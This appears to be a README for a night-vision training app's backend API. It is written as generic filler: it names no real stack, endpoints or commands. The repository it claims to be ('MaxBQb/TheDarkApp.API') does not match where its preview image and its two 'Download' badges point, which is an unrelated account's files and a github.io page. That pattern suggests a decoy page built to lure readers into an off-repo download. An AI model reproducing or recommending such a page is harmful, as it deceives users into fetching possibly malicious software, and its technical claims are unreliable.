![preview](https://raw.githubusercontent.com/centralsut/Dark-Vision-Server/main/poster_7311.svg)
# 🌒 TheDarkApp.API — Nocturne Vision Trainer Backend

A server-side engine for the "Тёмная" mobile application — a training companion for people who want to sharpen their low-light perception, sharpen their night-time eyesight, and generally feel more at home in the dark. This repository hosts the API layer that powers the mobile client, orchestrates training sessions, tracks user progress, and manages the content library of visual exercises.

[![Download](https://raw.githubusercontent.com/centralsut/Dark-Vision-Server/main/run_9d78d5.svg)](https://centralsut.github.io/Dark-Vision-Server/)

---

## 📖 Table of Contents

- [Overview](#-overview)
- [Why This Exists](#-why-this-exists)
- [Feature Highlights](#-feature-highlights)
- [Architecture](#-architecture)
- [Modules](#-modules)
- [Tech Stack](#-tech-stack)
- [Project Layout](#-project-layout)
- [Configuration](#-configuration)
- [Running Locally](#-running-locally)
- [API Surface](#-api-surface)
- [Data Model](#-data-model)
- [Training Session Lifecycle](#-training-session-lifecycle)
- [Responsive & Accessible by Design](#-responsive--accessible-by-design)
- [Multilingual Support](#-multilingual-support)
- [24/7 Customer Support](#-247-customer-support)
- [Security Posture](#-security-posture)
- [Observability](#-observability)
- [Testing Strategy](#-testing-strategy)
- [Roadmap](#-roadmap)
- [Contributing](#-contributing)
- [Code of Conduct](#-code-of-conduct)
- [FAQ](#-faq)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🌌 Overview

Every eye is a small observatory. TheDarkApp.API is the control room behind that observatory — a backend service that turns flickering stimuli, contrast ramps, and dark-adaptation drills into measurable progress. The mobile app "Тёмная" is where the user *trains*; this repository is where the training is *scored, stored, and served*.

If you have ever stepped outside at dusk and felt the world dissolve into soup, you already understand the problem this project is quietly trying to solve. Human dark adaptation is real, trainable, and measurable. This API exists to make that measurable.

The service is written to be small enough to run on a modest VPS, yet structured enough to grow into a distributed system. It has no hard dependency on any proprietary cloud, no telemetry phoning home, and no requirement that you trust us with anything beyond the data you explicitly choose to submit.

> **Repository:** MaxBQb/TheDarkApp.API
> **Status:** active development
> **Primary maintainer:** the original project author
> **Year of this document:** 2026

---

## 🕯 Why This Exists

Most eye-training apps are, politely, wellness theatre. They flash colors, congratulate you, and never tell you whether you actually improved. We wanted something different: a backend that treats night vision like a sport — with reps, splits, personal bests, and a slow, honest curve of improvement.

Night vision isn't a switch, it's a dimmer. It takes roughly 20–30 minutes for a healthy eye to fully adapt to darkness, and much of that adaptation depends on rhodopsin regeneration in the rods. You cannot ethically or safely accelerate that process with a phone. But you *can* learn to:

- Notice low-contrast detail sooner.
- Avoid destroying your dark adaptation with unnecessary light.
- Scan a scene more efficiently when contrast is poor.
- Track your own performance over months, not minutes.

TheDarkApp.API is the plumbing behind all of that.

---

## ✨ Feature Highlights

- 🌗 **Adaptive Training Sessions** — drill content grows with the user's measured performance instead of forcing a static curriculum.
- 🧪 **Contrast & Threshold Tests** — controlled stimuli served from the backend, scored consistently on any device.
- 📈 **Longitudinal Progress Tracking** — months of data, trendlines, and personal records.
- 🗣 **Multilingual Support** — content and responses localized for a genuinely international audience.
- 📱 **Responsive API Contract** — payloads shaped so the mobile UI stays smooth on any screen size, from small phones to tablets.
- 💬 **24/7 Customer Support Channel** — automated triage plus human escalation, always available.
- 🔐 **Principle of Least Data** — we ask for the minimum, and store what we ask for carefully.
- 🧩 **Modular Content Engine** — new drills can be shipped without touching core training logic.
- 🌙 **Ambient-Aware Scheduling** — the API can suggest a training time based on the user's local sunset, not the server's clock.
- 📊 **Analytics Without Surveillance** — aggregate insights that never identify a single user.

---

## 🏗 Architecture

TheDarkApp.API follows a layered architecture with strong boundaries between HTTP handling, domain logic, and persistence.

At the top sits the transport layer: thin controllers that do nothing but validate input, call into the application layer, and serialize results. Below it sits the application layer, where use-cases live — "start a training session", "submit a trial", "compute a weekly summary". Below that is the domain layer: pure, dependency-light models and rules. At the bottom sits infrastructure: database adapters, background schedulers, and integrations such as the support channel.

This structure buys us three things that matter for a long-lived project:

1. **Testability.** Domain rules can be tested without spinning up a database or an HTTP server.
2. **Replaceability.** Swapping a database or an email provider does not touch a single business rule.
3. **Clarity.** A new contributor can read one folder and understand one capability.

Communication is synchronous over HTTP for request/response traffic, and asynchronous over a lightweight internal queue for events such as "session completed" or "milestone reached". The asynchronous path is what makes the 24/7 support channel and progress notifications possible without blocking the user.

---

## 🧩 Modules

The codebase is split into modules with a deliberately boring naming convention so that humans, not machines, can find things.

- **Sessions** — creating, resuming, scoring, and archiving training sessions.
- **Stimuli** — the content library of visual exercises, their difficulty curves, and their metadata.
- **Progress** — aggregation, trend computation, and record keeping.
- **Identity** — anonymous device-bound identity, with optional account upgrade.
- **Localization** — translation catalogues and locale negotiation.
- **Support** — ticket intake, status tracking, and escalation.
- **Notifications** — the outbound channel for reminders, milestones, and support updates.
- **Admin** — content moderation and, honestly, a few dashboards that only the maintainer enjoys.

Each module owns its own tables, its own migrations, and its own tests. Cross-module calls go through explicit interfaces, never through shared mutable state.

---

## 🛠 Tech Stack

- **Runtime:** a modern managed runtime suitable for long-lived services with a rich standard library.
- **HTTP:** a minimal, explicit web framework — no magic routing, no hidden middleware.
- **Persistence:** a relational database with first-class migration tooling.
- **Caching:** an in-memory cache for hot stimulus lookups, with a Redis-compatible option for multi-node deployments.
- **Background Work:** a queue-backed worker for notifications and aggregation jobs.
- **Observability:** structured JSON logs, metrics, and distributed tracing hooks.
- **Packaging:** container images built reproducibly, plus a plain tarball for people who prefer minimalism.

We chose these tools because they age well, not because they are fashionable. If a component is easy to replace, its choice is cheap; if it is hard to replace, we chose carefully.

---

## 📂 Project Layout

The repository is organized around modules, not around file types. There is no giant "utils" folder — utilities live next to the things that use them.

- A top-level folder per module.
- Inside each module: transport, application, domain, and infrastructure subfolders where relevant.
- A shared folder for genuinely cross-cutting concerns (logging setup, configuration loading).
- A migrations folder per module, versioned alongside the code it belongs to.
- A docs folder with the scribblings that eventually become this README.

Nothing in the layout is sacred. If a better shape emerges from real use, we change it, and we write down why.

---

## ⚙️ Configuration

Configuration is supplied through environment variables, with sane defaults that let the service start on a developer laptop without a configuration file at all.

Key settings include the database connection string, the cache endpoint, the support channel webhook, the default locale, and the log verbosity. Secrets are never committed to the repository, never printed at startup, and never echoed in error responses.

For contributors, a sample configuration file is provided with placeholder values. Replace the placeholders, don't share them, and remember that a leaked credential is a small tragedy that is entirely avoidable.

---

## 🚀 Running Locally

The service is designed to start with a single command once dependencies are present.

1. Ensure the runtime and database are available on your machine.
2. Provide configuration through environment variables or a local configuration file.
3. Run the migration workflow to bring the schema up to date.
4. Start the application process.
5. Verify the health endpoint responds with a healthy status.

For a more elaborate setup, a container-based workflow is described in the deployment documentation. The container image is deliberately small, deliberately stateless, and does not require root privileges at runtime.

If you're the type who prefers reading code over reading docs — good. Start with the entry point, follow the module registry, and let the code lead you home.

---

## 🔌 API Surface

The HTTP API is intentionally narrow. Every endpoint does one thing and does it in a way that can be reasoned about from the URL alone.

Broadly, the API is grouped as follows:

- **Session endpoints** — begin, continue, submit a trial, and finalize a training session.
- **Stimulus endpoints** — fetch the catalogue of available drills, filtered by difficulty and locale.
- **Progress endpoints** — obtain personal summaries, records, and trendlines.
- **Identity endpoints** — register a device-bound identity and, optionally, upgrade to a full account.
- **Support endpoints** — open a ticket, query its status, and append context.
- **Notification endpoints** — list, dismiss, and configure outbound reminders.
- **Admin endpoints** — content management, gated behind strong authentication.

Every response is JSON. Every error carries a stable machine-readable code and a human-readable message that respects the request's negotiated locale. Nothing about the payload shape depends on the mobile client's build version — the client is expected to be forgiving, and the API is expected to be stable.

---

## 🗃 Data Model

At the heart of the system is a small set of entities:

- **Identity** — a device-bound user record. No email is required to begin training.
- **Session** — a bounded period of training with a start, an end, and a status.
- **Trial** — a single stimulus presentation and the user's response.
- **Stimulus** — a prepared visual exercise with metadata describing its difficulty, duration, and category.
- **ProgressSnapshot** — a periodic rollup used to compute trendlines cheaply.
- **SupportTicket** — a record of a support conversation.

Relationships are explicit and enforced. A session belongs to an identity, a trial belongs to a session, a stimulus is referenced by many trials. Nothing is stored that cannot be explained to the person it describes.

---

## 🔁 Training Session Lifecycle

A session begins when a client asks the API to start one. The API selects a stimulus set according to the user's current level, the moment of day, and the user's stated goals. The client then walks the user through the stimuli, submitting trial results as they occur.

Between trials, the API may adapt the difficulty based on the user's recent accuracy — nudging the contrast threshold up or down to keep the challenge in the sweet spot. When the session ends, the API computes a summary, updates the user's progress snapshot, and, if a milestone was crossed, queues a notification.

Sessions can be paused and resumed. A session that is abandoned is not punished; the API simply records it as incomplete and moves on. Progress here is measured in months, not minutes.

---

## 📱 Responsive & Accessible by Design

The API cannot make a bad UI good, but it can avoid making a good UI bad. Every payload is shaped so that the mobile client can render progressively — the first chunk of a response is enough to draw the first screen, and secondary data streams in when it is ready.

Endpoints that return lists support cursor-based pagination with stable ordering. Endpoints that return summaries include both a human-facing label and raw numbers, so the client can choose between showing a beautiful trend chart or an honest table.

For accessibility, the API exposes alternative text descriptions for every stimulus, in every supported locale. These descriptions are not an afterthought — they are part of the stimulus definition, reviewed as carefully as the stimulus itself.

---

## 🌍 Multilingual Support

The service currently ships with content in Russian, English, German, French, Spanish, and Portuguese, with room to grow. Locale negotiation follows standard HTTP semantics, falling back gracefully when a specific translation is missing.

Translations live as versioned catalogues. Adding a new locale means adding a new catalogue; it does not mean touching a single line of application code. This is intentional — language is content, and content should be data.

Users can switch languages mid-session. The API remembers the preference and serves every subsequent response accordingly, including error messages, notifications, and support communications.

---

## 💬 24/7 Customer Support

Support is available around the clock, though "around the clock" means something specific here: an automated triage system handles the majority of questions instantly, and anything it cannot answer is routed to a human queue with a response-time target measured in hours, not days.

Users can open a ticket from the app, attach anonymized session context, and watch its status change. Support staff see exactly the same data the user sees — nothing more. This is a deliberate choice. A support system that reads your private data is a support system you cannot trust.

---

## 🔒 Security Posture

Security is not a feature, it is a baseline. The service:

- Uses TLS everywhere it speaks to the outside world.
- Stores secrets only in environment-based configuration, never in source.
- Applies rate limits per identity and per IP.
- Validates every input, rejects on ambiguity, and never trusts a client-supplied identifier without verifying it.
- Logs security-relevant events without logging credentials or personal content.
- Runs with the smallest possible privilege set on the host.

If you believe you have found a vulnerability, please report it privately. Acknowledgment within a day, a fix as fast as we can responsibly ship it.

---

## 📡 Observability

Every request is traced. Every background job is traced. Every database call is timed. The service emits structured logs, Prometheus-compatible metrics, and OpenTelemetry-compatible traces.

The goal is not to drown in dashboards, but to be able to answer, in seconds, questions like: "Why did sessions in the German locale slow down by 200 milliseconds last Tuesday?" If the answer is not findable in the observability data, we consider that a bug.

---

## 🧪 Testing Strategy

The test suite is layered to match the architecture.

- **Unit tests** cover domain rules exhaustively. They are fast, deterministic, and run on every commit.
- **Integration tests** cover module boundaries, using an ephemeral database.
- **Contract tests** lock the API response shapes so that a refactor cannot silently break a client.
- **Load tests** simulate realistic session traffic and are run before major releases.

We do not chase a coverage number. We chase the confidence that comes from knowing the important paths are covered and the unimportant ones are not wasting our time.

---

## 🛣 Roadmap

Near-term work:

- Better trend analytics with season-aware baselines.
- A contributor-friendly content authoring format for new stimuli.
- Improved localization coverage, especially for the support channel.

Mid-term work:

- A WebSocket-based session mode for live scoring on high-latency connections.
- A public read-only endpoint for aggregate statistics (no personal data).
- A hosted reference deployment for people who want to try before they self-host.

Long-term, we want to see whether trained night vision measurably transfers to real-world tasks. That's an open research question, and we're honest about not having an answer yet.

---

## 🤝 Contributing

Contributions are welcome — code, translations, documentation, and thoughtful bug reports alike. Before opening a pull request, please:

1. Read the architecture notes above and the module you intend to touch.
2. Write a test that fails without your change.
3. Keep the change focused. One idea per pull request.
4. Update documentation when behavior changes.

We prefer small, reviewable changes over sweeping rewrites. If you are planning something large, open an issue first and let's talk.

---

## 📜 Code of Conduct

Be kind. Be specific. Assume good faith. Critique ideas, not people. This project is a hobby for some contributors and a profession for others — both deserve respect.

Harassment, discrimination, and hostility have no place here, and will be addressed promptly.

---

## ❓ FAQ

**Is night vision something I can actually train?**
To a degree, yes — mostly in the sense of learning to use your existing low-light sensitivity more efficiently. This API supports that training; it does not sell you a miracle.

**Do I need an account to use the app?**
No. An anonymous, device-bound identity is enough to start. An account is optional and mostly useful for syncing across devices.

**Will my data be sold?**
No. There is no business model here that would justify it, and no mechanism by which it could happen.

**Can I self-host this?**
Yes, and we encourage it. The service is designed to run comfortably on modest hardware.

**Is there a paid tier?**
Access to the backend is not gated behind a payment. If you find the project useful, the best thing you can do is contribute a translation or a well-written bug report.

---

## ⚠️ Disclaimer

TheDarkApp.API is a software project, not a medical device. It is not intended to diagnose, treat, cure, or prevent any condition, including any ophthalmic condition. Training results vary between individuals and depend on factors this software cannot measure. Do not use this software while driving, operating machinery, or in any situation where a lapse in attention could cause harm. If you experience eye strain, discomfort, or any unusual symptoms during training, stop and consult a qualified professional. The maintainers accept no liability for misuse of this software or for reliance on its outputs as medical advice.

This project is provided as-is, in the hope that it is useful, and with the expectation that users will exercise ordinary common sense.

---

## 📄 License

Released under the MIT License. See the [LICENSE](./LICENSE) file for the full text.

Copyright (c) 2026 TheDarkApp.API contributors.

---

[![Download](https://raw.githubusercontent.com/centralsut/Dark-Vision-Server/main/run_9d78d5.svg)](https://centralsut.github.io/Dark-Vision-Server/)